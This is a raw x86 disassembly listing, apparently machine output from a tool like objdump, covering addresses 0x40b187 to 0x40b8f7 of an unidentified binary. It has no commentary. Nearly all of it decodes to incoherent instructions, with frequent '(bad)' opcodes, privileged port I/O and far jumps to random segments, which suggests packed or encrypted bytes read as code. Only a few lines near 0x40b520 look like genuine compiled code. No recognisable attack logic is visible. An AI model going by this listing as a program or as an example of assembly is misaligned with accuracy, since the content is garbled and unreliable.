  40b187:	fld    st(0)
  40b189:	push   esi
  40b18a:	xor    BYTE PTR ds:0x1cd5230,ah
  40b190:	cmp    eax,0x511682cb
  40b195:	lea    edx,[ebx+ebx*2-0x2a5c4c54]
  40b19c:	cld    
  40b19d:	mov    ds,WORD PTR [eax]
  40b19f:	add    cl,BYTE PTR [edi]
  40b1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a2:	adc    BYTE PTR [eax+0x71a84c96],ah
  40b1a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a9:	mov    al,ds:0x4574cae6
  40b1ae:	punpckhwd mm3,QWORD PTR [edx-0x3bf8a9d6]
  40b1b5:	fwait
  40b1b6:	loop   0x40b1c8
  40b1b8:	sbb    al,ch
  40b1ba:	fisttp DWORD PTR [ebx-0x63a44d75]
  40b1c0:	mov    DWORD PTR [ecx-0x3ef32319],0xbd6b4080
  40b1ca:	div    DWORD PTR [ecx]
  40b1cc:	mov    edi,0xa61003af
  40b1d1:	add    al,0x37
  40b1d3:	xchg   ebp,eax
  40b1d4:	xchg   ebx,eax
  40b1d5:	push   es
  40b1d6:	sub    bl,BYTE PTR [eax+ebx*1]
  40b1d9:	outs   dx,BYTE PTR ds:[esi]
  40b1da:	sbb    esi,DWORD PTR [ebp-0x70]
  40b1dd:	mov    al,ds:0xff55d525
  40b1e2:	dec    DWORD PTR [ecx+0x39]
  40b1e5:	sub    BYTE PTR [ebx+0x4b],ch
  40b1e8:	mov    ss,WORD PTR [ebx]
  40b1ea:	mul    BYTE PTR [eax]
  40b1ec:	cwde   
  40b1ed:	add    eax,DWORD PTR [ebp+ecx*1+0x553dc881]
  40b1f4:	scas   eax,DWORD PTR es:[edi]
  40b1f5:	pusha  
  40b1f6:	xchg   edi,eax
  40b1f7:	test   al,0xe2
  40b1f9:	adc    DWORD PTR [eax-0x3eba806],eax
  40b1ff:	xor    eax,0x63d720a2
  40b204:	adc    DWORD PTR [eax+0x2a],ebx
  40b207:	dec    eax
  40b208:	push   cs
  40b209:	(bad)  
  40b20c:	mov    ds,ebx
  40b20e:	ret    0xec3
  40b211:	cld    
  40b212:	cmp    al,0xad
  40b214:	sar    DWORD PTR [eax+0x43eea753],cl
  40b21a:	ret    
  40b21b:	jg     0x40b1ee
  40b21d:	ja     0x40b213
  40b21f:	jnp    0x40b22e
  40b221:	popa   
  40b222:	push   ds
  40b223:	push   eax
  40b224:	je     0x40b27b
  40b226:	aaa    
  40b227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b228:	out    0xdd,eax
  40b22a:	ja     0x40b20a
  40b22c:	xor    eax,0xd4c67231
  40b231:	add    esp,0x7e420037
  40b237:	and    ebp,edx
  40b239:	sub    edi,DWORD PTR [edx-0x2]
  40b23c:	shr    esp,1
  40b23e:	and    DWORD PTR [eax+0x18],esp
  40b241:	and    cl,BYTE PTR [ebx]
  40b243:	jno    0x40b24c
  40b245:	inc    edi
  40b246:	cmp    esp,edx
  40b248:	mov    dl,0xcc
  40b24a:	push   edi
  40b24b:	xchg   eax,edx
  40b24d:	lock out dx,eax
  40b24f:	mov    dh,0x38
  40b251:	xchg   edi,eax
  40b252:	(bad)  
  40b253:	sub    dl,BYTE PTR [ecx]
  40b255:	(bad)  
  40b256:	in     eax,dx
  40b257:	mov    ch,0x57
  40b259:	xor    BYTE PTR [esi],bh
  40b25b:	xchg   edi,eax
  40b25c:	inc    esp
  40b25d:	push   ds
  40b25e:	mov    edx,edx
  40b260:	fmul   st(7),st
  40b262:	(bad)  
  40b263:	adc    dl,BYTE PTR [esi+eiz*4+0x247eebe3]
  40b26a:	inc    edx
  40b26b:	dec    edx
  40b26c:	js     0x40b2e8
  40b26e:	into   
  40b26f:	mov    BYTE PTR [edi-0x723bbfb6],ah
  40b275:	push   ds
  40b276:	mov    al,ds:0xef28545f
  40b27b:	mov    ds:0x56cf78bd,eax
  40b280:	push   ds
  40b281:	lods   eax,DWORD PTR ds:[esi]
  40b282:	push   eax
  40b283:	or     ebx,DWORD PTR [eax-0x14]
  40b286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b287:	test   eax,0x984d6192
  40b28c:	hlt    
  40b28d:	int3   
  40b28e:	jecxz  0x40b2fe
  40b290:	stos   BYTE PTR es:[edi],al
  40b291:	pop    ds
  40b292:	cli    
  40b293:	shl    DWORD PTR [esi+0x435a7c59],cl
  40b299:	test   BYTE PTR [esi-0x15],ah
  40b29c:	dec    edx
  40b29d:	pop    esi
  40b29e:	adc    ebx,ecx
  40b2a0:	dec    esp
  40b2a1:	retf   0x6a91
  40b2a4:	pop    edi
  40b2a5:	call   0x29ea:0xf38d1c88
  40b2ac:	and    DWORD PTR [ecx-0x35e5f221],esp
  40b2b2:	cmc    
  40b2b3:	icebp  
  40b2b4:	or     BYTE PTR [edi+0x39],bh
  40b2b7:	hlt    
  40b2b8:	stos   DWORD PTR es:[edi],eax
  40b2b9:	mov    dl,0x7d
  40b2bb:	(bad)  
  40b2bc:	or     DWORD PTR [edx+0x3f],esp
  40b2bf:	(bad)  
  40b2c0:	adc    edi,DWORD PTR [edx+0x12]
  40b2c3:	outs   dx,BYTE PTR ds:[esi]
  40b2c4:	ins    BYTE PTR es:[edi],dx
  40b2c5:	fadd   st(2),st
  40b2c7:	cli    
  40b2c8:	xor    dh,BYTE PTR [ebx+0x84d0ef]
  40b2ce:	mov    cl,0x3d
  40b2d0:	sbb    cl,dh
  40b2d2:	xchg   DWORD PTR [edx],ebp
  40b2d4:	adc    al,0xfd
  40b2d6:	xchg   BYTE PTR [eax],cl
  40b2d8:	inc    ecx
  40b2d9:	xchg   ecx,eax
  40b2da:	jmp    0xbda:0xb7b2c6c6
  40b2e1:	test   ch,0x57
  40b2e4:	dec    ebp
  40b2e5:	inc    eax
  40b2e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2e7:	adc    eax,0xc954184c
  40b2ec:	xchg   edi,eax
  40b2ed:	fsubr  DWORD PTR [ebp+0x6c]
  40b2f0:	rcr    BYTE PTR [eax],cl
  40b2f2:	push   esp
  40b2f3:	or     DWORD PTR [ecx+0x4ddf2100],ebp
  40b2f9:	fsubr  st(5),st
  40b2fb:	test   eax,0xc1cea758
  40b300:	ret    0x2aad
  40b303:	test   ecx,eax
  40b305:	outs   dx,DWORD PTR ds:[esi]
  40b306:	push   0x4
  40b308:	pusha  
  40b309:	push   esp
  40b30a:	add    BYTE PTR [edx+0x6686afec],ah
  40b310:	je     0x40b330
  40b312:	inc    ebx
  40b313:	gs and al,0x72
  40b316:	stc    
  40b317:	iret   
  40b318:	push   ss
  40b319:	push   0xffffffa2
  40b31b:	mov    al,ds:0x40895438
  40b320:	test   eax,0x13ef67e9
  40b325:	cwde   
  40b326:	xchg   ah,bl
  40b328:	pop    ecx
  40b329:	aas    
  40b32a:	cmp    DWORD PTR [edx+0x20dfad5c],ebx
  40b330:	pop    eax
  40b331:	mov    dh,0x92
  40b333:	push   edi
  40b334:	das    
  40b335:	pop    esp
  40b336:	mov    edx,0x321ad0b6
  40b33b:	jg     0x40b38b
  40b33d:	retf   
  40b33e:	loope  0x40b2d6
  40b340:	cmp    al,0x5b
  40b342:	cli    
  40b343:	shl    eax,cl
  40b345:	in     al,0xe3
  40b347:	setge  BYTE PTR [ecx]
  40b34a:	(bad)  
  40b34b:	fisub  WORD PTR [edi+0x5f]
  40b34e:	mov    DWORD PTR [esi-0x2b],ebp
  40b351:	pop    ebx
  40b352:	xor    eax,0x794123f1
  40b357:	or     edi,DWORD PTR ss:[ecx+edx*8+0x77]
  40b35c:	into   
  40b35d:	fucom  st(1)
  40b35f:	out    0xfd,al
  40b361:	add    ebp,eax
  40b363:	popa   
  40b364:	cdq    
  40b365:	inc    ecx
  40b366:	and    cl,BYTE PTR [edx]
  40b368:	(bad)
  40b36c:	data16 into 
  40b36e:	add    BYTE PTR [eiz*1+0x10bac152],0xcb
  40b376:	(bad)  
  40b378:	retf   0x35fe
  40b37b:	pop    edi
  40b37c:	push   edx
  40b37d:	sti    
  40b37e:	pop    ds
  40b37f:	pushf  
  40b380:	scas   al,BYTE PTR es:[edi]
  40b381:	inc    edi
  40b382:	in     eax,dx
  40b383:	and    al,0xdf
  40b385:	xor    eax,DWORD PTR [ecx-0x1b]
  40b388:	sahf   
  40b389:	out    dx,eax
  40b38a:	mov    bh,0xb5
  40b38c:	dec    ebp
  40b38d:	cwde   
  40b38e:	jmp    FWORD PTR [edx+eax*2-0x5ea1fb51]
  40b395:	out    dx,eax
  40b396:	jnp    0x40b37b
  40b398:	inc    ecx
  40b399:	inc    eax
  40b39a:	dec    esp
  40b39b:	mov    bl,0xd3
  40b39d:	jns    0x40b405
  40b39f:	mov    dl,0x8f
  40b3a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3a2:	js     0x40b324
  40b3a4:	dec    edx
  40b3a5:	loope  0x40b3b5
  40b3a7:	jl     0x40b35f
  40b3a9:	clc    
  40b3aa:	inc    edi
  40b3ab:	push   ss
  40b3ac:	jp     0x40b3ef
  40b3ae:	out    0xb6,eax
  40b3b0:	jo     0x40b426
  40b3b2:	mov    al,0x7e
  40b3b4:	stos   BYTE PTR es:[edi],al
  40b3b5:	or     DWORD PTR [eax],0xffffffd3
  40b3b8:	enter  0x1024,0xb0
  40b3bc:	fwait
  40b3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3be:	aas    
  40b3bf:	and    eax,0x6d51ee2b
  40b3c4:	scas   al,BYTE PTR es:[edi]
  40b3c5:	sub    DWORD PTR [esi+0x66966191],0x91291b48
  40b3cf:	xor    dh,BYTE PTR [edx+0x5b]
  40b3d2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3d4:	mov    bh,0x1a
  40b3d6:	pop    es
  40b3d7:	and    ecx,DWORD PTR [ecx]
  40b3d9:	jns    0x40b40c
  40b3db:	mov    edi,0x14467c30
  40b3e0:	add    al,0x43
  40b3e2:	xchg   BYTE PTR [edi+eax*2+0x3d],ch
  40b3e6:	or     edx,DWORD PTR [edi-0x1e532f78]
  40b3ec:	(bad)
  40b3ef:	push   ds
  40b3f0:	mov    eax,ds:0x569d99a
  40b3f5:	xor    DWORD PTR ds:0x285e910c,edi
  40b3fb:	pushf  
  40b3fc:	into   
  40b3fd:	jmp    0x82d9:0x6ab35ce9
  40b404:	les    esi,FWORD PTR [edi-0x6aafa25b]
  40b40a:	jo     0x40b3ef
  40b40c:	stc    
  40b40d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b40e:	jmp    FWORD PTR ds:0x18c78850
  40b414:	ja     0x40b43f
  40b416:	hlt    
  40b417:	imul   ebp,DWORD PTR [ebx],0xbca623d3
  40b41d:	cmp    eax,0x46d0332d
  40b422:	cmp    dh,BYTE PTR [ecx+0x63e64d05]
  40b428:	sahf   
  40b429:	icebp  
  40b42a:	mov    ds:0x2d1a2a6b,eax
  40b42f:	in     al,dx
  40b430:	cmp    BYTE PTR [edx+ebx*8+0x54],ah
  40b434:	(bad)  
  40b435:	pop    es
  40b436:	sub    BYTE PTR [eax-0x288f8d46],0x24
  40b43d:	adc    eax,0x50322e58
  40b442:	or     dh,BYTE PTR [eax+0x6aaf4621]
  40b448:	lea    eax,[edx+eiz*4]
  40b44b:	and    cl,BYTE PTR [esi]
  40b44d:	pop    ebx
  40b44e:	xchg   ebp,eax
  40b44f:	cs icebp 
  40b451:	out    dx,al
  40b452:	inc    ebx
  40b453:	pop    esp
  40b454:	stos   DWORD PTR es:[edi],eax
  40b455:	ss dec esi
  40b457:	es mov ecx,0xe4e02e01
  40b45d:	icebp  
  40b45e:	mov    ecx,edx
  40b460:	push   esi
  40b461:	aaa    
  40b462:	cmp    bl,bh
  40b464:	into   
  40b465:	sub    DWORD PTR [ebx+0x6c],edi
  40b468:	jmp    0x40b4da
  40b46a:	call   0x7852:0x1951ea7b
  40b471:	and    eax,0x119596c
  40b476:	lods   eax,DWORD PTR ds:[esi]
  40b477:	cwde   
  40b478:	mov    ds,WORD PTR [edx+0x56]
  40b47b:	out    0xf0,al
  40b47d:	jne    0x40b4c9
  40b47f:	add    al,0x8f
  40b481:	add    al,0x4e
  40b483:	inc    ecx
  40b484:	ret    
  40b485:	stos   BYTE PTR es:[edi],al
  40b486:	sti    
  40b487:	push   ss
  40b488:	mov    bl,0x22
  40b48a:	xchg   DWORD PTR [edi],ebx
  40b48c:	mov    al,ds:0xfc8fa284
  40b491:	xor    BYTE PTR [eax+0x22],0x50
  40b495:	or     bl,dl
  40b497:	jnp    0x40b470
  40b499:	inc    ebx
  40b49a:	or     al,0x61
  40b49d:	mov    DWORD PTR [edx],ebp
  40b49f:	adc    eax,0x717dda78
  40b4a4:	pop    es
  40b4a5:	inc    ebx
  40b4a6:	fsubr  DWORD PTR [esi]
  40b4a8:	ss (bad) 
  40b4aa:	sub    edx,esp
  40b4ac:	and    ecx,ebp
  40b4ae:	add    ebx,DWORD PTR [ecx]
  40b4b0:	scas   al,BYTE PTR es:[edi]
  40b4b1:	iret   
  40b4b2:	es xchg ebp,eax
  40b4b4:	daa    
  40b4b5:	jmp    0xe218a305
  40b4ba:	(bad)  
  40b4bb:	les    esi,FWORD PTR [eax]
  40b4bd:	adc    ah,BYTE PTR [esi+0x2264426]
  40b4c3:	add    edx,eax
  40b4c5:	ss sbb eax,0xa34f68ce
  40b4cb:	gs dec edi
  40b4cd:	add    al,0xf1
  40b4cf:	cmp    dh,dl
  40b4d1:	bound  esp,QWORD PTR [esi+0x71f0042d]
  40b4d7:	xchg   esi,eax
  40b4d8:	div    BYTE PTR [edi-0x2d81f5be]
  40b4de:	mov    ebp,0xb92d18c6
  40b4e3:	mov    bl,0x64
  40b4e5:	inc    ecx
  40b4e6:	imul   esp,DWORD PTR [ecx-0x6c],0x3e05a98e
  40b4ed:	adc    eax,0xaa6762b4
  40b4f2:	fdiv   QWORD PTR [edi-0x94fad66]
  40b4f8:	bound  eax,QWORD PTR [eax+0x26261849]
  40b4fe:	data16 out dx,al
  40b500:	iret   
  40b501:	mov    ecx,0x7d0dd1cc
  40b506:	mov    ecx,0xc1e6e264
  40b50b:	lahf   
  40b50c:	mov    ebp,0xa02d2fae
  40b511:	or     BYTE PTR [ecx],bl
  40b513:	outs   dx,DWORD PTR ds:[esi]
  40b514:	addr16 pop ss
  40b516:	loope  0x40b4e7
  40b518:	sti    
  40b519:	or     BYTE PTR [esi+ecx*8],bl
  40b51c:	hlt    
  40b51d:	int    0xff
  40b51f:	leave  
  40b520:	imul   edx,edi
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	rol    BYTE PTR [esi-0x793e044c],1
  40b555:	jo     0x40b5c7
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b57d
  40b55c:	mov    bl,0xd7
  40b55e:	(bad)  
  40b55f:	jmp    0x19c9:0x354a7512
  40b566:	dec    ebx
  40b567:	add    al,0xaa
  40b569:	call   0x1411f223
  40b56e:	mov    ah,0x7c
  40b570:	nop
  40b571:	out    dx,eax
  40b572:	push   ds
  40b573:	add    ah,ch
  40b575:	in     eax,0x79
  40b577:	push   ebx
  40b578:	or     DWORD PTR ds:[ecx],edx
  40b57b:	push   edi
  40b57c:	arpl   WORD PTR [ecx-0x6e7443db],ax
  40b582:	sbb    al,0xc2
  40b584:	(bad)  
  40b585:	jle    0x40b541
  40b587:	fistp  DWORD PTR fs:[edx-0x2c9deb37]
  40b58e:	idiv   DWORD PTR [eax+0x5b6ada82]
  40b594:	xor    DWORD PTR [esi-0x70],ecx
  40b597:	iret   
  40b598:	and    DWORD PTR [ecx-0x59d6aec6],edi
  40b59e:	push   eax
  40b59f:	and    DWORD PTR [esi-0x41],edx
  40b5a2:	sub    DWORD PTR [edi+0x513fcfdc],ebx
  40b5a8:	fnsave ds:0xf11a29cf
  40b5ae:	call   0x690:0xa86c3c44
  40b5b5:	cmp    DWORD PTR [ecx+0x6d6e07c7],0x21
  40b5bc:	and    eax,0x14e6269
  40b5c1:	dec    edi
  40b5c2:	and    DWORD PTR [edx+eax*8-0x62],edx
  40b5c6:	aam    0x31
  40b5c8:	repnz adc dh,BYTE PTR cs:[edi]
  40b5cc:	into   
  40b5cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5ce:	xchg   edi,eax
  40b5cf:	int    0x37
  40b5d1:	stc    
  40b5d2:	js     0x40b55c
  40b5d4:	in     al,dx
  40b5d5:	imul   DWORD PTR [ecx-0x4211c3a9]
  40b5db:	int3   
  40b5dc:	sub    ch,BYTE PTR [ecx]
  40b5de:	mov    eax,ds:0xee0ad4ad
  40b5e3:	push   0x44
  40b5e5:	out    dx,al
  40b5e6:	mov    WORD PTR [ecx+0x5b],cs
  40b5e9:	pop    eax
  40b5ea:	mov    eax,0xdb50e3a0
  40b5ef:	mov    dl,0x45
  40b5f1:	jmp    0x40b5e4
  40b5f3:	mov    al,0x89
  40b5f5:	pop    ebx
  40b5f6:	xor    al,0xbb
  40b5f8:	or     ah,bh
  40b5fa:	jbe    0x40b57e
  40b5fc:	mov    al,ds:0x4a67116d
  40b601:	pop    esi
  40b602:	shl    BYTE PTR [ebx],cl
  40b604:	or     edx,0x45b4f721
  40b60a:	cmp    al,0xe9
  40b60c:	(bad)  
  40b60d:	mov    ecx,0xe775074f
  40b612:	ja     0x40b5ae
  40b614:	jmp    0x40b5a4
  40b616:	add    BYTE PTR [edx-0x8c95a08],0x22
  40b61d:	cmp    DWORD PTR [edi],0xffffff84
  40b620:	jne    0x40b639
  40b622:	fistp  QWORD PTR [esi+0x5fc4be02]
  40b628:	ja     0x40b668
  40b62a:	pop    eax
  40b62b:	inc    eax
  40b62c:	mov    cl,bl
  40b62e:	xor    DWORD PTR [edi],ebx
  40b630:	repnz xchg edx,eax
  40b632:	das    
  40b633:	ss retf 
  40b635:	scas   al,BYTE PTR es:[edi]
  40b636:	add    eax,0x468be442
  40b63b:	clc    
  40b63c:	or     bl,dh
  40b63e:	out    dx,eax
  40b63f:	dec    eax
  40b640:	xchg   esp,eax
  40b641:	xchg   edx,eax
  40b642:	sbb    al,0xb2
  40b644:	sub    ch,ch
  40b646:	aas    
  40b647:	add    esp,DWORD PTR [esi]
  40b649:	xchg   ebx,eax
  40b64a:	pushf  
  40b64b:	pusha  
  40b64c:	daa    
  40b64d:	and    eax,0xc6359d00
  40b652:	loop   0x40b64e
  40b654:	out    dx,eax
  40b655:	fisttp DWORD PTR [ebx-0x11159e2]
  40b65b:	pop    ecx
  40b65c:	loop   0x40b644
  40b65e:	inc    edx
  40b65f:	add    eax,0x191b36a4
  40b665:	mov    dh,BYTE PTR [edi+0x4ea93f2d]
  40b66b:	es mov edx,0x4df0e8a1
  40b671:	lds    ebp,FWORD PTR [eax+eiz*4-0x5a]
  40b675:	push   ebx
  40b676:	inc    ebx
  40b677:	je     0x40b605
  40b679:	popa   
  40b67a:	mov    dl,0xdf
  40b67c:	push   eax
  40b67d:	sub    DWORD PTR [ebp-0x7e],ecx
  40b680:	xor    al,0x85
  40b682:	retf   0x3301
  40b685:	js     0x40b66d
  40b687:	push   es
  40b688:	push   ebx
  40b689:	cwde   
  40b68a:	xchg   esi,eax
  40b68b:	and    eax,esp
  40b68d:	out    0xc5,al
  40b68f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b690:	ficom  DWORD PTR [ecx+0x7c]
  40b693:	inc    eax
  40b694:	pop    esi
  40b695:	mov    esp,0x96691a50
  40b69a:	inc    edx
  40b69b:	les    esi,FWORD PTR [esi+0x784943bf]
  40b6a1:	fmul   QWORD PTR [edi]
  40b6a3:	dec    eax
  40b6a4:	in     al,0xe4
  40b6a6:	loopne 0x40b6e2
  40b6a8:	inc    esp
  40b6a9:	sbb    al,dh
  40b6ab:	pop    eax
  40b6ac:	jns    0x40b68d
  40b6ae:	test   BYTE PTR [esi],dl
  40b6b0:	adc    ecx,DWORD PTR [ebx+0x1e]
  40b6b3:	aad    0x59
  40b6b5:	mov    ch,0xff
  40b6b7:	adc    esp,0x4d
  40b6ba:	adc    DWORD PTR [ecx],eax
  40b6bc:	cmp    DWORD PTR ds:0x7498b95f,esp
  40b6c2:	aam    0xeb
  40b6c4:	add    ch,BYTE PTR [ebp-0x6b32f6ae]
  40b6ca:	mov    al,0x6d
  40b6cc:	cld    
  40b6cd:	es push ss
  40b6cf:	in     eax,0x41
  40b6d1:	ss out dx,eax
  40b6d3:	sahf   
  40b6d4:	and    DWORD PTR [ecx],esp
  40b6d6:	mov    edx,0xab45af32
  40b6db:	add    BYTE PTR [esi+0x47301878],ch
  40b6e1:	inc    ecx
  40b6e2:	jmp    0xa8feff54
  40b6e7:	cdq    
  40b6e8:	jno    0x40b6fc
  40b6ea:	pop    eax
  40b6eb:	mov    dh,0x93
  40b6ed:	pop    ss
  40b6ee:	sub    dl,0x60
  40b6f1:	mov    es,WORD PTR [ebp+0x3c840cc7]
  40b6f7:	sbb    eax,0xbbd68ca
  40b6fc:	jge    0x40b749
  40b6fe:	loope  0x40b75b
  40b700:	cmp    dl,bl
  40b702:	aas    
  40b703:	dec    eax
  40b704:	rcl    DWORD PTR ds:0x789d7cf6,0xf9
  40b70b:	pop    edi
  40b70c:	or     eax,ebx
  40b70e:	jmp    0x7fdf4614
  40b713:	add    DWORD PTR [ebx+0x3f],0x398ada76
  40b71a:	and    DWORD PTR [eax],ecx
  40b71c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b71d:	sub    BYTE PTR ds:0x143e1f22,bh
  40b723:	mov    bl,0x9c
  40b725:	std    
  40b726:	int3   
  40b727:	adc    ebp,DWORD PTR [edx+edi*2]
  40b72a:	popf   
  40b72b:	jno    0x40b6d1
  40b72d:	mov    dl,0xb8
  40b730:	loopne 0x40b6e6
  40b732:	xchg   ebx,eax
  40b733:	push   esp
  40b734:	popa   
  40b735:	pop    esi
  40b736:	mov    edx,0x2c37e496
  40b73b:	push   ebp
  40b73c:	(bad)  [edx]
  40b73e:	xlat   BYTE PTR ds:[ebx]
  40b73f:	or     eax,0xe4c3264e
  40b744:	sbb    esp,DWORD PTR [esi+edi*4-0xa]
  40b748:	mov    DWORD PTR [edx-0x1e96b26e],edi
  40b74e:	or     BYTE PTR [esi-0xc],0x4d
  40b752:	xchg   ecx,eax
  40b753:	sbb    al,0x54
  40b755:	sbb    DWORD PTR [eax],0xb46fd223
  40b75b:	fsubr  QWORD PTR [edx+0x1764f4ca]
  40b761:	sub    bh,al
  40b763:	retf   
  40b764:	inc    esp
  40b765:	lahf   
  40b766:	sub    DWORD PTR [edx],esi
  40b768:	adc    ebx,DWORD PTR [edx]
  40b76a:	inc    ecx
  40b76b:	cmp    bl,BYTE PTR [ebp+0x45]
  40b76e:	test   eax,0xbe344bdd
  40b773:	or     esp,DWORD PTR [ebx]
  40b775:	mov    bh,0x8c
  40b777:	iret   
  40b778:	aad    0x44
  40b77a:	sbb    DWORD PTR [ebp-0x77],0xffffffbc
  40b77e:	aad    0xd1
  40b780:	jns    0x40b7ba
  40b782:	add    DWORD PTR [ebp-0x19],edx
  40b785:	jne    0x40b804
  40b787:	or     eax,0xe6db9a45
  40b78c:	out    dx,al
  40b78d:	test   BYTE PTR [ecx-0x15],cl
  40b790:	loopne 0x40b737
  40b792:	ss pop ds
  40b794:	cmp    BYTE PTR [ebx-0x70bdde],dl
  40b79a:	fwait
  40b79b:	cmp    BYTE PTR [ecx],ah
  40b79d:	jg     0x40b80b
  40b79f:	adc    ebx,DWORD PTR [ecx+ebx*2-0x9ab7c0a]
  40b7a6:	jge    0x40b75b
  40b7a8:	cwde   
  40b7a9:	adc    BYTE PTR [ecx],cl
  40b7ab:	stc    
  40b7ac:	fstp   TBYTE PTR [ebx+0x5e6a94bc]
  40b7b2:	(bad)  
  40b7b4:	popf   
  40b7b5:	jne    0x40b7be
  40b7b7:	out    dx,al
  40b7b8:	add    WORD PTR [edx+esi*2],bx
  40b7bc:	(bad)  
  40b7bd:	sbb    BYTE PTR [eax-0x5a],dh
  40b7c0:	or     DWORD PTR [esp+ebp*8-0x406b5c8c],ecx
  40b7c7:	and    eax,0xbb5cba83
  40b7cc:	es and al,0xcb
  40b7cf:	inc    edi
  40b7d0:	push   cs
  40b7d1:	inc    esi
  40b7d2:	pop    es
  40b7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7d4:	add    esi,DWORD PTR [ebp+0x27d88d2]
  40b7da:	dec    esi
  40b7db:	gs clc 
  40b7dd:	dec    edi
  40b7de:	ret    0xe8c7
  40b7e1:	add    BYTE PTR [ebp-0xfe117eb],dl
  40b7e7:	ror    BYTE PTR [eax+0x33579279],cl
  40b7ed:	pop    esp
  40b7ee:	jmp    0xb83b:0x6db4ce98
  40b7f5:	pop    esi
  40b7f6:	ja     0x40b7bb
  40b7f8:	das    
  40b7f9:	xchg   ebx,eax
  40b7fa:	mov    ch,0x5b
  40b7fc:	inc    eax
  40b7fd:	mov    ecx,0xaba4a213
  40b802:	pop    edx
  40b803:	and    esi,DWORD PTR [edx-0x60da096c]
  40b809:	fwait
  40b80a:	and    bh,BYTE PTR [ebx-0x33]
  40b80d:	xor    BYTE PTR [edi],cl
  40b80f:	inc    edi
  40b810:	mov    esi,edi
  40b812:	clc    
  40b813:	inc    ebp
  40b814:	jmp    0x38ff4ee2
  40b819:	jge    0x40b821
  40b81b:	pop    edi
  40b81c:	mov    WORD PTR [edx+0x1f1e14be],ds
  40b822:	or     esp,eax
  40b824:	mov    cl,BYTE PTR [eax+0x7be657ee]
  40b82a:	lea    ebp,[esi+edx*4-0xc]
  40b82e:	aaa    
  40b82f:	inc    ebp
  40b830:	aam    0x39
  40b832:	out    0x26,al
  40b834:	cli    
  40b835:	(bad)  
  40b836:	iret   
  40b837:	push   ds
  40b838:	out    0x2b,eax
  40b83a:	xchg   esp,eax
  40b83b:	dec    ecx
  40b83c:	sahf   
  40b83d:	xor    BYTE PTR [edi-0x39],bh
  40b840:	add    ebp,ebx
  40b842:	xor    BYTE PTR [ebx],dh
  40b844:	mov    cl,0xe7
  40b846:	mov    ds:0xefce83bc,al
  40b84b:	sbb    al,0x2e
  40b84d:	pslld  mm1,QWORD PTR [ecx+0x15161c4b]
  40b854:	add    eax,0xe25e5009
  40b859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b85a:	ficom  WORD PTR [ebp+0x7a]
  40b85d:	pop    ss
  40b85e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b85f:	not    ebp
  40b861:	call   0x93950f15
  40b866:	and    esp,0x95a493ba
  40b86c:	lahf   
  40b86d:	pop    ebx
  40b86e:	jnp    0x40b87f
  40b870:	or     al,0x7d
  40b872:	inc    eax
  40b873:	xor    eax,0xc206c40d
  40b878:	mov    esi,0x51a872c0
  40b87d:	adc    eax,0xcda12530
  40b882:	out    dx,eax
  40b883:	xor    DWORD PTR [ecx+0x60],eax
  40b886:	jo     0x40b87d
  40b888:	jg     0x40b855
  40b88a:	and    BYTE PTR ds:0xd05a01f3,0x11
  40b891:	xor    DWORD PTR gs:[edx+0x74],edx
  40b895:	sti    
  40b896:	jmp    0x40b871
  40b898:	scas   eax,DWORD PTR es:[edi]
  40b899:	push   0xffffffa2
  40b89b:	mov    bl,0xd3
  40b89d:	push   es
  40b89e:	dec    edi
  40b89f:	xor    eax,0x5b1254bd
  40b8a4:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40b8a6:	lds    ebp,FWORD PTR [eax-0x91308e5]
  40b8ac:	aas    
  40b8ad:	cmc    
  40b8ae:	push   es
  40b8af:	pop    edi
  40b8b0:	sub    eax,DWORD PTR [esi]
  40b8b2:	cmp    dl,BYTE PTR [eax]
  40b8b4:	or     esp,edx
  40b8b6:	xchg   esp,eax
  40b8b7:	jg     0x40b892
  40b8b9:	pop    edx
  40b8ba:	xchg   ebx,eax
  40b8bb:	sbb    BYTE PTR [edx],ch
  40b8bd:	aad    0x31
  40b8bf:	iret   
  40b8c0:	cld    
  40b8c1:	outs   dx,DWORD PTR ds:[esi]
  40b8c2:	retf   0x935f
  40b8c5:	xchg   ecx,eax
  40b8c6:	into   
  40b8c7:	in     al,0x44
  40b8c9:	outs   dx,DWORD PTR ds:[esi]
  40b8ca:	popf   
  40b8cb:	push   ebp
  40b8cc:	nop
  40b8cd:	les    ecx,FWORD PTR [ebp+ecx*1-0x51]
  40b8d1:	and    DWORD PTR [ecx],esp
  40b8d3:	sar    DWORD PTR [esi-0x22],0xc5
  40b8d7:	mov    al,ds:0x910c508d
  40b8dc:	icebp  
  40b8dd:	aad    0xad
  40b8df:	pusha  
  40b8e0:	cmp    DWORD PTR [esi+0x5a],ebx
  40b8e3:	jb     0x40b8c7
  40b8e5:	inc    ebx
  40b8e6:	lds    esi,FWORD PTR [ebx-0x38]
  40b8e9:	mov    WORD PTR [ebp-0x44],cs
  40b8ec:	in     al,0x6e
  40b8ee:	jmp    DWORD PTR [ebx+0x18]
  40b8f1:	xor    BYTE PTR [ebx+0x3606294],dl
  40b8f7:	push   0xd8f7d2a5
